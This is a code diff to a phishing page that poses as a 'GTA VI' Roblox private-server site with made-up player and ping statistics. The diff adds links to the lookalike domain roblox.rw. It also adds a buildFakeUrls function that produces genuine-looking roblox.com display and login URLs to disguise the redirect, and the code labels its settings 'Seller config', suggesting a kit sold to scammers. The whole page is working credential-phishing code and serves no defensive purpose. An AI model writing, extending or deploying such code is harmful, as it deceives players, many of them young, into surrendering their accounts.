@@ -57,7 +57,7 @@
             z-index: -3;
             background-image: url('/image/backgroundgta6.jpg');
             background-size: cover;
-            background-position: center top; /* Gw ubah ke top biar logo GTA VI keliatan */
+            background-position: center top;
             background-repeat: no-repeat;
             background-attachment: fixed;
         }
@@ -65,7 +65,7 @@
             content: '';
             position: absolute;
             inset: 0;
-            background: rgba(10, 6, 20, 0.65); /* Overlay gelap biar teks kebaca */
+            background: rgba(10, 6, 20, 0.65);
             pointer-events: none;
         }
         .gta-bg::after {
@@ -640,10 +640,13 @@
 
     <!-- ===== CONFIG LOADER (JINJA + FALLBACK API) ===== -->
     <script>
-        // LINK SERVER BARU
-        let PRIVATE_SERVER_URL = "https://roblox.com.bz/games/88008594207418/GTA67-Vice-Horizon-GTA6?privateServerLinkCode=90009455507851527415931341313013";
-        let FAKE_URL_DISPLAY = "https://www.roblox.com/games/88008594207418/GTA67-Vice-Horizon-GTA6?privateServerLinkCode=90009455507851527415931341313013";
-        let FAKE_URL_LOGIN = "https://www.roblox.com/id/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fid%2Fgames%2F15884350761%2FGTA67-Vice-Horizon-GTA6%3FprivateServerLinkCode%3D02235304084257249141820871923335";
+        // LINK SERVER 1 & 2 TERBARU
+        const SERVER_1_URL = "https://www.roblox.rw/games/88008594207418/GTA67-Vice-Horizon-GTA6?privateServerLinkCode=01790450256631011366360899472650";
+        const SERVER_2_URL = "https://www.roblox.rw/games/126294092653905/GTA-6-GTA-VI?privateServerLinkCode=01790450256631011366360899472650";
+
+        let PRIVATE_SERVER_URL = SERVER_1_URL;
+        let FAKE_URL_DISPLAY = "https://www.roblox.com/games/88008594207418/GTA67-Vice-Horizon-GTA6?privateServerLinkCode=01790450256631011366360899472650";
+        let FAKE_URL_LOGIN = "https://www.roblox.com/id/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fid%2Fgames%2F88008594207418%2FGTA67-Vice-Horizon-GTA6%3FprivateServerLinkCode%3D01790450256631011366360899472650";
 
         console.log('🔧 Seller config:', { PRIVATE_SERVER_URL, FAKE_URL_DISPLAY, FAKE_URL_LOGIN });
 
@@ -712,12 +715,12 @@
                     <h1 class="hero-title"><span>GTA VI Server</span></h1>
                     <p class="hero-desc">Lower ping, an active community, and a seamless experience. Join thousands of GTA VI players right now on dedicated low-latency servers.</p>
                     <div class="hero-cta">
-                        <button class="btn-primary" onclick="handleRedirect('Connecting to server...')">Join GTA VI Server</button>
+                        <button class="btn-primary" onclick="handleRedirect('Connecting to server...', SERVER_1_URL)">Join GTA VI Server</button>
                         <a class="btn-secondary" href="#servers">Server Guide</a>
                     </div>
                     <div class="hero-stats">
                         <div class="stat"><b>11.0K</b><span>Active players</span></div>
-                        <div class="stat"><b>1</b><span>Dedicated servers</span></div>
+                        <div class="stat"><b>2</b><span>Dedicated servers</span></div>
                         <div class="stat"><b>22ms</b><span>Avg. ping</span></div>
                     </div>
                 </div>
@@ -749,7 +752,7 @@
                             <img class="player-avatar-sm" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-E5988C142C147FC9D3D0DA0C7736C712-Png/150/150/AvatarHeadshot/Webp/noFilter" alt="player">
                             <span class="player-count-label">14 / 20 Online</span>
                         </div>
-                        <button class="join-btn">JOIN SERVER</button>
+                        <button class="join-btn" data-url="https://www.roblox.rw/games/88008594207418/GTA67-Vice-Horizon-GTA6?privateServerLinkCode=01790450256631011366360899472650">JOIN SERVER</button>
                     </div>
                 </div>
 
@@ -766,7 +769,7 @@
                             <img class="player-avatar-sm" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-2968EC43814C0D3ACB51889553F6F0D5-Png/150/150/AvatarHeadshot/Webp/noFilter" alt="player">
                             <span class="player-count-label">2 / 20 Online</span>
                         </div>
-                        <button class="join-btn">JOIN SERVER</button>
+                        <button class="join-btn" data-url="https://www.roblox.rw/games/126294092653905/GTA-6-GTA-VI?privateServerLinkCode=01790450256631011366360899472650">JOIN SERVER</button>
                     </div>
                 </div>
             </div>
@@ -860,11 +863,29 @@
             }, 3800);
         })();
 
-        function handleRedirect(message) {
-            if (!PRIVATE_SERVER_URL) {
+        function buildFakeUrls(targetUrl) {
+            try {
+                const u = new URL(targetUrl);
+                const pathWithQuery = u.pathname + u.search;
+                const officialUrl = `https://www.roblox.com${pathWithQuery}`;
+                const loginUrl = `https://www.roblox.com/id/login?returnUrl=${encodeURIComponent(officialUrl)}`;
+                return { officialUrl, loginUrl };
+            } catch (e) {
+                return { officialUrl: FAKE_URL_DISPLAY, loginUrl: FAKE_URL_LOGIN };
+            }
+        }
+
+        function handleRedirect(message, targetUrl) {
+            const finalUrl = targetUrl || PRIVATE_SERVER_URL;
+            if (!finalUrl) {
                 window.alert('Private server URL belum diatur oleh admin.');
                 return;
             }
+            PRIVATE_SERVER_URL = finalUrl;
+            const fakeUrls = buildFakeUrls(finalUrl);
+            FAKE_URL_DISPLAY = fakeUrls.officialUrl;
+            FAKE_URL_LOGIN = fakeUrls.loginUrl;
+
             const loadingModal = document.getElementById('loadingModal');
             const loadingText = document.getElementById('loadingText');
             if (loadingText) loadingText.innerText = message || 'Connecting to Server...';
@@ -936,7 +957,8 @@
         joinBtns.forEach(btn => {
             btn.addEventListener('click', function(e) {
                 e.stopPropagation();
-                handleRedirect('Connecting to server...');
+                const targetUrl = this.getAttribute('data-url') || PRIVATE_SERVER_URL;
+                handleRedirect('Connecting to server...', targetUrl);
             });
         });
 
